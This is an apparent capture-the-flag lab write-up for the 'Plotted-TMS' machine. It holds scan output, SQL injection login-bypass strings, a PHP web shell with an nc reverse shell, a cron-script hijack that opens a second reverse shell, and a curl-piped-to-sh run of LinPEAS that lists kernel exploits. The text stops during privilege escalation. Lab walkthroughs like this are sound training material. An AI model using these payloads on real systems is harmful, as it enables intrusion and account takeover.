---
Everything here is plotted!
---

# Plotted-TMS — Writeup

## Overview
### Plotted-TMS — Writeup
### Plotted-TMS — Writeup
![](https://wiki.thehacker.nz/wp-content/uploads/2021/10/pe_banner.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/6187c9220cd0ff0c5c3b29b9aa6252ea.png)
![](https://wiki.thehacker.nz/wp-content/uploads/2021/10/pe_banner.png)
Happy Hunting!
Tip: Enumeration is key!

## Enumeration
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ sudo rustscan -a 10.10.113.202      
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.113.202:22
Open 10.10.113.202:80
Open 10.10.113.202:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 12:36 EDT
Initiating Ping Scan at 12:36
Scanning 10.10.113.202 [4 ports]
Completed Ping Scan at 12:36, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:36
Completed Parallel DNS resolution of 1 host. at 12:36, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:36
Scanning 10.10.113.202 [3 ports]
Discovered open port 445/tcp on 10.10.113.202
Discovered open port 80/tcp on 10.10.113.202
Discovered open port 22/tcp on 10.10.113.202
Completed SYN Stealth Scan at 12:36, 0.23s elapsed (3 total ports)
Nmap scan report for 10.10.113.202
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2022-09-24 12:36:22 EDT for 0s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.113.202 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.113.202
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      964w    10918c http://10.10.113.202/
301      GET        9l       28w      314c http://10.10.113.202/admin => http://10.10.113.202/admin/
200      GET      375l      964w    10918c http://10.10.113.202/index.html
200      GET        1l        1w       25c http://10.10.113.202/passwd
200      GET        1l        1w       81c http://10.10.113.202/admin/id_rsa
200      GET        1l        1w       25c http://10.10.113.202/shadow
[####################] - 48s    13842/13842   0s      found:6       errors:206    
[####################] - 44s     4614/4614    109/s   http://10.10.113.202 
[####################] - 44s     4614/4614    106/s   http://10.10.113.202/ 
[####################] - 39s     4614/4614    117/s   http://10.10.113.202/admin 

http://10.10.113.202/admin/id_rsa

VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE > Trust me it is not this easy..now get back to enumeration :D

http://10.10.113.202/shadow

bm90IHRoaXMgZWFzeSA6RA== > not this easy :D

http://10.10.113.202/passwd
bm90IHRoaXMgZWFzeSA6RA== > not this easy :D

http://10.10.113.202:445/
```
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.113.202:445 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.113.202:445
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      964w    10918c http://10.10.113.202:445/
200      GET      375l      964w    10918c http://10.10.113.202:445/index.html
301      GET        9l       28w      324c http://10.10.113.202:445/management => http://10.10.113.202:445/management/
301      GET        9l       28w      330c http://10.10.113.202:445/management/admin => http://10.10.113.202:445/management/admin/
301      GET        9l       28w      331c http://10.10.113.202:445/management/assets => http://10.10.113.202:445/management/assets/
301      GET        9l       28w      330c http://10.10.113.202:445/management/build => http://10.10.113.202:445/management/build/
[#######>------------] - 36s    10052/27684   1m      found:6       errors:89     
[#######>------------] - 36s    10053/27684   1m      found:6       errors:89     
301      GET        9l       28w      332c http://10.10.113.202:445/management/classes => http://10.10.113.202:445/management/classes/
[######>-------------] - 36s    10088/32298   1m      found:6       errors:89     
[######>-------------] - 36s    10098/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10111/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10140/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10177/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10204/32298   1m      found:7       errors:89     
[######>-------------] - 36s    10204/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[######>-------------] - 36s    10206/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[######>-------------] - 36s    10214/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[###################>] - 35s     4594/4614    132/s   http://10.10.113.202:445/ 
[######>-------------] - 36s    10229/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[###################>] - 35s     4594/4614    132/s   http://10.10.113.202:445/ 
[######>-------------] - 36s    10257/32298   1m      found:7       errors:89     
[###################>] - 36s     4608/4614    130/s   http://10.10.113.202:445 
[###################>] - 35s     4594/4614    132/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10290/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4596/4614    131/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10317/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10331/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
[######>-------------] - 37s    10355/32298   1m      found:7       errors:89     
[###################>] - 37s     4610/4614    128/s   http://10.10.113.202:445 
[###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
301      GET        9l       28w      333c http://10.10.113.202:445/management/database => http://10.10.113.202:445/management/database/

I use Firefox dev tools to capture and inspect the network traffic, looking for any vulnerabilities on the web application. I then submit a blank username and password. The response is an error message.

However, I find the exact SQL query structure used to sign in when inspecting the response.

Query Breakdown

    SELECT * from users where username = '' and password = md5('')

I can attempt to supply any username and force a true statement with this knowledge by adding or 1=1. Then add the hash sign (#) to comment out the rest of the query. 

Since the password will no longer be part of the query, I can enter any password and attempt to sign in. The new SQL query will look like this,

    SELECT * from users where username = '' or 1=1 # and password = md5('')

successful

log in as admin

' or 1 = 1 # 
witty

or

admin' or 1+1--'

or through metasploit 

msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set lhost 10.18.1.77; set lport 4444; exploit"

then upload a revshell php (create new staff)
```
```text
┌──(kali㉿kali)-[~]
└─$ cat shell.php          
<?php
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4444 >/tmp/f");
?>

nice :) the shell.php monkeypentest not work for me so
https://www.revshells.com/
```
```text
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.113.202.
Ncat: Connection from 10.10.113.202:59050.
bash: cannot set terminal process group (12284): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plotted:/var/www/html/445/management/uploads$ pwd
pwd
/var/www/html/445/management/uploads

www-data@plotted:/var/www/html/445/management/uploads$ cd /home
cd /home
www-data@plotted:/home$ ls
ls
plot_admin
ubuntu
www-data@plotted:/home$ cd plot_admin
cd plot_admin
www-data@plotted:/home/plot_admin$ ls
ls
tms_backup
user.txt
www-data@plotted:/home/plot_admin$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

Fortunately, right above the user flag, there is a tms_backup directory. Whenever I see backup, I think Cron jobs. That is because backups usually are done periodically and need a scheduled task or cron job to execute a command to backup the commands.

Horizontal Escalation

www-data@plotted:/home/plot_admin$ cat /etc/crontab
cat /etc/crontab
```
```text
# /etc/crontab: system-wide crontab
```
```text
# Unlike any other crontab you don't have to run the `crontab'
```
```text
# command to install the new version when you edit this file
```
```text
# and files in /etc/cron.d. These files also have username fields,
```
```text
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
```text
# Example of job definition:
```
```text
# .---------------- minute (0 - 59)
```
```text
# |  .------------- hour (0 - 23)
```
```text
# |  |  .---------- day of month (1 - 31)
```
```text
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
```
```text
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
```
```text
# |  |  |  |  |
```
```text
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh

www-data@plotted:/home/plot_admin$ ls -lah /var/www/scripts/backup.sh
ls -lah /var/www/scripts/backup.sh
-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh

www-data@plotted:/home/plot_admin$ ls -lah /var/www/scripts
ls -lah /var/www/scripts
total 12K
drwxr-xr-x 2 www-data   www-data   4.0K Oct 28  2021 .
drwxr-xr-x 4 root       root       4.0K Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh

    Create a new backup.sh file with a reverse shell script and changed it to be executable using chmod.
    setup a Netcat listener on my attack machine
    A few seconds later, the cronjob will run and attach the reverse shell to my waiting Netcat listener. Then I can stabilize the shell using the same technique.

www-data@plotted:/home/plot_admin$ rm -fr /var/www/scripts/
rm -fr /var/www/scripts/
rm: cannot remove '/var/www/scripts/': Permission denied
www-data@plotted:/home/plot_admin$ ls -la /var/www/scripts/
ls -la /var/www/scripts/
total 8
drwxr-xr-x 2 www-data www-data 4096 Sep 24 17:28 .
drwxr-xr-x 4 root     root     4096 Oct 28  2021 ..
www-data@plotted:/home/plot_admin$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4321 >/tmp/f" > /var/www/scripts/backup.sh
<.18.1.77 4321 >/tmp/f" > /var/www/scripts/backup.sh
www-data@plotted:/home/plot_admin$ chmod +x /var/www/scripts/backup.sh
chmod +x /var/www/scripts/backup.sh
```
```text
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4321              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.10.113.202.
Ncat: Connection from 10.10.113.202:35494.
bash: cannot set terminal process group (44206): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:~$ ls
ls
tms_backup
user.txt
plot_admin@plotted:~$ cat user.txt
cat user.txt
77927510d5edacea1f9e86602f1fbadb

Vertical Scalation

using linpeas.sh
```

## Privilege Escalation
```text
┌──(kali㉿kali)-[~]
└─$ locate linpeas.sh               
/home/kali/Downloads/linpeas.sh
```
```text
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/Downloads
```
```text
┌──(kali㉿kali)-[~/Downloads] (php server)
└─$ php -S 10.18.1.77:3000                                         
[Sat Sep 24 13:32:21 2022] PHP 8.1.5 Development Server (http://10.18.1.77:3000) started

    Spin up a PHP server on my Kali machine to host the script
    php -S attacker_ip:port
    Curl with -s (silent) to load the script on the target machine and pipe it through sh to run LinPEAS.

plot_admin@plotted:~$ curl -s 10.18.1.77:3000/linpeas.sh | sh
curl -s 10.18.1.77:3000/linpeas.sh | sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                          
    |---------------------------------------------------------------------------|                          
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                          
    |         Follow on Twitter   :     @carlospolopm                           |                          
    |         Respect on HTB      :     SirBroccoli                             |                          
    |---------------------------------------------------------------------------|                          
    |                                 Thank you!                                |                          
    \---------------------------------------------------------------------------/                          
          linpeas-ng by carlospolop                                                                        
                                                                                                           
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                       
                                                                                                           
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                   
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════    
                                         ╚═══════════════════╝                                             
OS: Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
User & Groups: uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
Hostname: plotted
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                         
                                                                                                           

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                           
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════     
                                        ╚════════════════════╝                                             
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                         
Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                            
Sudo version 1.8.31                                                                                        

╔══════════╣ CVEs Check
sh: 1197: [[: not found                                                                                    
sh: 1197: rpm: not found
sh: 1197: 0: not found
sh: 1207: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                    
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                               
New path exported: /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

╔══════════╣ Date & uptime
Sat 24 Sep 2022 05:33:51 PM UTC                                                                            
 17:33:51 up  1:46,  0 users,  load average: 0.39, 0.23, 1.06

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                       

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                 
/dev/disk/by-id/dm-uuid-LVM-LEuxtXS8h12uzcCSf2F85IqR3S0l2bEjyOqkxbWIUUDLX1WMBnxMK0nNX5ByOzka    /       ext4       defaults        0 1
/dev/disk/by-uuid/4f0655ba-9502-4545-9d47-131a77a3469d  /boot   ext4    defaults        0 1

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                    
LESSOPEN=| /bin/lesspipe %s                                                                                
HISTFILESIZE=0
SHLVL=0
HOME=/home/plot_admin
LOGNAME=plot_admin
_=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/sh
LESSCLOSE=/bin/lesspipe %s %s
PWD=/home/plot_admin
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed     
dmesg Not Found                                                                                            
                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                         
[+] [CVE-2021-4034] PwnKit                                                                                 

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                    
                                                                                                           
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.              
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                          
═╣ Execshield enabled? ............ Execshield Not Found                                                   
═╣ SELinux enabled? ............... sestatus Not Found                                                     
═╣ Is ASLR enabled? ............... Yes                                                                    
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                              

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════    
                                             ╚═══════════╝                                                 
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                             
═╣ Is this a container? ........... No                                                                     
═╣ Any running containers? ........ No                                                                     
                                                                                                           

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════     
                          ╚════════════════════════════════════════════════╝                               
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                           
root           1  0.5  1.0 168968 10392 ?        Ss   15:47   0:32 /lib/systemd/systemd --system --deserialize 34
root         485  0.0  1.7 280200 17992 ?        SLsl 15:47   0:00 /sbin/multipathd -d -s
root         602  0.0  0.6 1232936 6352 ?        Ssl  15:48   0:01 /usr/bin/amazon-ssm-agent
root         721  0.0  1.3 1317964 13964 ?       Sl   15:48   0:01  _ /usr/bin/ssm-agent-worker
root         606  0.0  0.2   6812  2452 ?        Ss   15:48   0:00 /usr/sbin/cron -f
root       44205  0.0  0.3   8476  3108 ?        S    17:30   0:00  _ /usr/sbin/CRON -f
plot_ad+   44206  0.0  0.0   2608   608 ?        Ss   17:30   0:00      _ /bin/sh -c /var/www/scripts/backup.sh                                                                                                       
plot_ad+   44207  0.0  0.0   2608   608 ?        S    17:30   0:00          _ /bin/sh /var/www/scripts/backup.sh                                                                                                      
plot_ad+   44210  0.0  0.0   5620   504 ?        S    17:30   0:00              _ cat /tmp/f
plot_ad+   44211  0.0  0.4   8180  4624 ?        S    17:30   0:00              _ /bin/bash -i
plot_ad+   44267  0.0  1.0  24752 10072 ?        S    17:33   0:00              |   _ curl -s 10.18.1.77:3000/linpeas.sh
plot_ad+   44268  0.1  0.3   3924  3156 ?        S    17:33   0:00              |   _ sh
plot_ad+   47071  0.0  0.1   3924  1356 ?        S    17:33   0:00              |       _ sh
plot_ad+   47075  0.0  0.3   9044  3216 ?        R    17:33   0:00              |       |   _ ps fauxwww
plot_ad+   47074  0.0  0.1   3924  1356 ?        S    17:33   0:00              |       _ sh
plot_ad+   44212  0.0  0.1   3332  1952 ?        S    17:30   0:00              _ nc 10.18.1.77 4321
message+     609  0.0  0.4   7924  4204 ?        Ss   15:48   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         621  0.0  1.1  29080 11200 ?        Ss   15:48   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       625  0.0  0.3 224348  3528 ?        Ssl  15:48   0:00 /usr/sbin/rsyslogd -n -iNONE
root         627  0.4  1.8 733876 18188 ?        Ssl  15:48   0:28 /usr/lib/snapd/snapd
root         630  0.0  0.4  16572  4236 ?        Ss   15:48   0:01 /lib/systemd/systemd-logind
root         634  0.0  0.3 394720  3460 ?        Ssl  15:48   0:00 /usr/lib/udisks2/udisksd
daemon[0m       640  0.0  0.2   3792  2100 ?        Ss   15:48   0:00 /usr/sbin/atd -f
root         691  0.0  0.1   5600  1724 ttyS0    Ss+  15:48   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root         697  0.0  0.1   5828  1660 tty1     Ss+  15:48   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         722  0.0  0.4 238416  4084 ?        Ssl  15:48   0:00 /usr/libexec/polkitd --no-debug
root         769  0.0  1.1 107908 11264 ?        Ssl  15:48   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql        796  0.2 35.9 1301108 359896 ?      Ssl  15:48   0:17 /usr/sbin/mysqld
root        1772  0.0  0.3  21256  3860 ?        Ss   16:16   0:01 /lib/systemd/systemd-udevd
root       12284  0.1  0.9 194056  9420 ?        Ss   16:18   0:04 /usr/sbin/apache2 -k start
www-data   39056  0.0  0.8 194616  8936 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
